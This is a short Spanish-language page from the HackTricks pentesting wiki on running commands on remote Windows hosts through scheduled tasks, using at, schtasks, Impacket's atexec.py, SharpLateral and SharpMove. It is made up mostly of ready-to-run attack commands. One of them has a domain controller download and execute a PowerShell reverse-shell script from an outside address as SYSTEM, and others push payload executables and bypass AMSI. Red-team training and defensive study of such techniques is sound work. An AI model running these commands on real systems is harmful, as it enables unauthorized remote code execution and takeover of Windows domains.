# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## ¿Cómo funciona?

At permite programar tareas en hosts donde conoces el username/(password/Hash). Por lo tanto, puedes usarlo para ejecutar comandos en otros hosts y obtener la salida.
```
At \\victim 11:00:00PM shutdown -r
```
Usando `schtasks`, primero debes crear la tarea y luego ejecutarla:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Puedes usar **`atexec.py` de Impacket** para ejecutar comandos en sistemas remotos mediante el comando AT. Esto requiere credenciales válidas (nombre de usuario y contraseña o hash) para el sistema objetivo.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
También puedes usar [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Puedes usar [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Más información sobre el [**uso de schtasks con silver tickets aquí**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
